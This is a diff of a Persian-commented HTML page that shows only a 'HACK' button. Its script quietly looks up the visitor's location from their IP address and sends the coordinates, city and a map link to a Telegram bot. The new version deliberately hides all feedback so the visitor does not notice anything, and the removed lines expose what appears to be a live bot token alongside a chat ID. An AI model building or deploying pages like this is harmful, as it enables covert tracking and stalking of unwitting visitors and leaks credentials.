@@ -1,105 +1,107 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سیستم امنیتی</title>
+    <title>صفحه</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial;direction:rtl}
-        .container{background:#111;padding:30px;border-radius:20px;border:1px solid #0f0;text-align:center;max-width:420px;width:95%}
-        h1{color:#0f0;font-size:20px;margin-bottom:10px}
-        .sub{color:#888;font-size:13px;margin-bottom:20px}
-        .btn{background:transparent;border:2px solid #0f0;color:#0f0;padding:14px 30px;font-size:20px;border-radius:50px;cursor:pointer;width:100%;transition:0.3s;font-weight:bold}
-        .btn:hover{background:#0f0;color:#000}
-        .btn:disabled{opacity:0.3;cursor:not-allowed}
-        #status{color:#0f0;margin-top:15px;font-size:14px;min-height:25px}
-        #log{background:#1a1a1a;padding:10px;margin-top:15px;border-radius:8px;font-size:12px;color:#0f0;text-align:left;font-family:monospace;min-height:60px;max-height:200px;overflow:auto;border:1px solid #333;direction:ltr}
-        .error{color:#f44}
-        .manual-box{background:#1a1a1a;border:1px solid #f44;padding:15px;margin-top:15px;border-radius:10px}
-        .manual-box a{color:#0f0;font-size:16px;display:block;margin:10px 0;text-decoration:underline}
-        .manual-box .hint{color:#888;font-size:12px}
-        .success-box{background:#1a1a1a;border:1px solid #0f0;padding:15px;margin-top:15px;border-radius:10px;color:#0f0}
+        body{
+            background:#0a0a0a;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            min-height:100vh;
+            font-family:Arial;
+        }
+        .container{
+            text-align:center;
+        }
+        .btn-hack{
+            background:transparent;
+            border:3px solid #00ff41;
+            color:#00ff41;
+            padding:25px 60px;
+            font-size:32px;
+            font-weight:bold;
+            border-radius:15px;
+            cursor:pointer;
+            transition:0.3s;
+            font-family:Arial;
+            letter-spacing:3px;
+            box-shadow:0 0 40px rgba(0,255,65,0.1);
+        }
+        .btn-hack:hover{
+            background:#00ff41;
+            color:#0a0a0a;
+            box-shadow:0 0 80px rgba(0,255,65,0.3);
+            transform:scale(1.03);
+        }
+        .btn-hack:active{
+            transform:scale(0.95);
+        }
+        .btn-hack:disabled{
+            opacity:0.2;
+            cursor:default;
+            transform:none;
+            box-shadow:none;
+        }
+        /* هیچ پیام یا تغییری نمایش داده نمی‌شود */
+        #hidden-status{
+            display:none;
+        }
     </style>
 </head>
 <body>
-<div class="container">
-    <h1>⛔ تأیید هویت</h1>
-    <div class="sub">برای ادامه، کلیک کنید</div>
-    <button class="btn" id="hackBtn" onclick="handleHack()">HACK</button>
-    <div id="status">✅ آماده</div>
-    <div id="log">⏳ منتظر کلیک...</div>
-</div>
+    <div class="container">
+        <button class="btn-hack" id="hackBtn">HACK</button>
+    </div>
 
-<script>
-// ===== تنظیمات =====
-const BOT_TOKEN = '8891127738:AAEJAQww9ts_V-Rcliwrvjm6ftbdZ1bRitM';   // <-- توکن خود را اینجا بگذارید
-const CHAT_ID = '6340337525';         // <-- Chat ID خود را اینجا بگذارید
+    <script>
+    // ===== تنظیمات =====
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN';   // <-- توکن خود را اینجا بگذارید
+    const CHAT_ID = '6340337525';         // <-- Chat ID خود را اینجا بگذارید
 
-const statusEl = document.getElementById('status');
-const logEl = document.getElementById('log');
-const btn = document.getElementById('hackBtn');
+    const btn = document.getElementById('hackBtn');
 
-function setStatus(msg, isError = false) {
-    statusEl.textContent = msg;
-    statusEl.style.color = isError ? '#f44' : '#0f0';
-}
+    // ===== تابع دریافت موقعیت =====
+    async function getLocation() {
+        try {
+            //先用 geoplugin (معمولاً در ایران کار می‌کند)
+            const res = await fetch('https://geoplugin.net/json.gp', { signal: AbortSignal.timeout(5000) });
+            const data = await res.json();
+            if (data.geoplugin_latitude && data.geoplugin_latitude != '0') {
+                return {
+                    lat: parseFloat(data.geoplugin_latitude),
+                    lon: parseFloat(data.geoplugin_longitude),
+                    city: data.geoplugin_city || 'نامشخص',
+                    country: data.geoplugin_countryName || 'نامشخص',
+                    method: 'GeoPlugin'
+                };
+            }
+        } catch(e) {}
 
-function addLog(msg, isError = false) {
-    const line = document.createElement('div');
-    line.textContent = '> ' + msg;
-    line.style.color = isError ? '#f44' : '#0f0';
-    logEl.appendChild(line);
-    logEl.scrollTop = logEl.scrollHeight;
-    console.log(msg);
-}
+        try {
+            // پشتیبان: ip-api
+            const res = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) });
+            const data = await res.json();
+            if (data.status === 'success') {
+                return {
+                    lat: data.lat,
+                    lon: data.lon,
+                    city: data.city,
+                    country: data.country,
+                    method: 'IP-API'
+                };
+            }
+        } catch(e) {}
 
-// ===== دریافت موقعیت از IP (با ۲ سرویس مختلف) =====
-async function getLocation() {
-    // سرویس اول: geoplugin (معمولاً در ایران کار می‌کند)
-    try {
-        addLog('🌐 تلاش geoplugin...');
-        const res = await fetch('https://geoplugin.net/json.gp', { signal: AbortSignal.timeout(4000) });
-        const data = await res.json();
-        if (data.geoplugin_latitude && data.geoplugin_latitude != '0') {
-            addLog('✅ موقعیت از geoplugin دریافت شد');
-            return {
-                lat: parseFloat(data.geoplugin_latitude),
-                lon: parseFloat(data.geoplugin_longitude),
-                city: data.geoplugin_city || 'نامشخص',
-                country: data.geoplugin_countryName || 'نامشخص',
-                method: 'GeoPlugin'
-            };
-        }
-    } catch(e) {
-        addLog('❌ geoplugin خطا: ' + e.message, true);
+        return null;
     }
 
-    // سرویس دوم: ip-api (پشتیبان)
-    try {
-        addLog('🌐 تلاش ip-api...');
-        const res = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(4000) });
-        const data = await res.json();
-        if (data.status === 'success') {
-            addLog('✅ موقعیت از ip-api دریافت شد');
-            return {
-                lat: data.lat,
-                lon: data.lon,
-                city: data.city,
-                country: data.country,
-                method: 'IP-API'
-            };
-        }
-    } catch(e) {
-        addLog('❌ ip-api خطا: ' + e.message, true);
-    }
-
-    return null;
-}
-
-// ===== ارسال به تلگرام =====
-async function sendToTelegram(loc) {
-    const text = 
+    // ===== ارسال به تلگرام =====
+    async function sendToTelegram(loc) {
+        const text = 
 📍 موقعیت جدید:
 🌐 عرض: ${loc.lat}
 🌐 طول: ${loc.lon}
@@ -108,92 +110,30 @@ async function sendToTelegram(loc) {
 📡 روش: ${loc.method}
 🔗 نقشه: https://www.google.com/maps?q=${loc.lat},${loc.lon};
 
-    const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)};
-    addLog('📤 ارسال به تلگرام...');
-    try {
-        const res = await fetch(url, { method: 'GET', signal: AbortSignal.timeout(5000) });
-        const data = await res.json();
-        if (data.ok) {
-            addLog('✅ پیام ارسال شد!');
-            return true;
-        } else {
-            addLog('❌ خطا: ' + data.description, true);
-            return false;
+        const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)};
+        try {
+            await fetch(url, { method: 'GET', signal: AbortSignal.timeout(5000) });
+        } catch(e) {}
+    }
+
+    // ===== تابع اصلی (با کلیک دکمه) =====
+    async function handleClick() {
+        // غیرفعال کردن دکمه (برای جلوگیری از کلیک مجدد)
+        btn.disabled = true;
+        // دریافت موقعیت
+        const loc = await getLocation();
+        
+        // اگر موقعیت دریافت شد، به تلگرام ارسال کن
+        if (loc) {
+            await sendToTelegram(loc);
         }
-    } catch(e) {
-        addLog('❌ خطا: ' + e.message, true);
-        return false;
-    }
-}
-
-// ===== نمایش گزینه دستی =====
-function showManualOption() {
-    const botUsername = BOT_TOKEN.split(':')[0];
-    const manualHtml = 
-        <div class="manual-box">
-            <div style="color:#f44;font-size:14px;margin-bottom:10px">⚠️ ارسال خودکار ممکن نیست</div>
-            <a href="https://t.me/${botUsername}" target="_blank">📱 باز کردن بات در تلگرام</a>
-            <div class="hint">پس از باز شدن بات، دکمه 📎 را بزنید و <b>Location</b> را انتخاب کنید.</div>
-            <div class="hint" style="margin-top:5px;color:#666">یا روی لینک زیر کلیک کنید:</div>
-            <a href="tg://resolve?domain=${botUsername}" style="font-size:13px;color:#888">tg://resolve?domain=${botUsername}</a>
-        </div>
-    ;
-    logEl.insertAdjacentHTML('beforeend', manualHtml);
-    logEl.scrollTop = logEl.scrollHeight;
-}
-
-// ===== نمایش پیام موفقیت =====
-function showSuccess() {
-    const successHtml = 
-        <div class="success-box">
-            ✅ موقعیت با موفقیت ارسال شد!
-        </div>
-    ;
-    logEl.insertAdjacentHTML('beforeend', successHtml);
-    logEl.scrollTop = logEl.scrollHeight;
-}
-
-// ===== تابع اصلی (با کلیک دکمه) =====
-async function handleHack() {
-    addLog('🚀 شروع فرآیند...');
-    btn.disabled = true;
-    btn.style.opacity = '0.3';
-    setStatus('⏳ در حال پردازش...');
-
-    const loc = await getLocation();
-
-    if (!loc) {
-        setStatus('❌ موقعیت دریافت نشد', true);
-        addLog('❌ هیچ موقعیتی دریافت نشد', true);
-        showManualOption();
+        
+        // دکمه را دوباره فعال کن (به نظر کاربر هیچ اتفاقی نیفتاده)
         btn.disabled = false;
-        btn.style.opacity = '1';
-        return;
     }
 
-    setStatus(✅ موقعیت: ${loc.lat}, ${loc.lon});
-    addLog(✅ موقعیت نهایی: ${loc.lat}, ${loc.lon} (${loc.method}));
-
-    const sent = await sendToTelegram(loc);
-
-    if (sent) {
-        setStatus('✅ ارسال شد!');
-        showSuccess();
-        addLog('⏳ ریدایرکت در ۲ ثانیه...');
-        setTimeout(() => {
-            window.location.href = 'https://www.google.com';
-        }, 2000);
-    } else {
-        setStatus('⚠️ ارسال خودکار ناموفق', true);
-        addLog('⚠️ ارسال به تلگرام ناموفق بود', true);
-        showManualOption();
-        btn.disabled = false;
-        btn.style.opacity = '1';
-    }
-}
-
-// ===== پیام اولیه =====
-addLog('✅ صفحه بارگذاری شد. دکمه را بزنید.');
-</script>
+    // ===== اتصال رویداد کلیک =====
+    btn.addEventListener('click', handleClick);
+    </script>
 </body>
 </html>
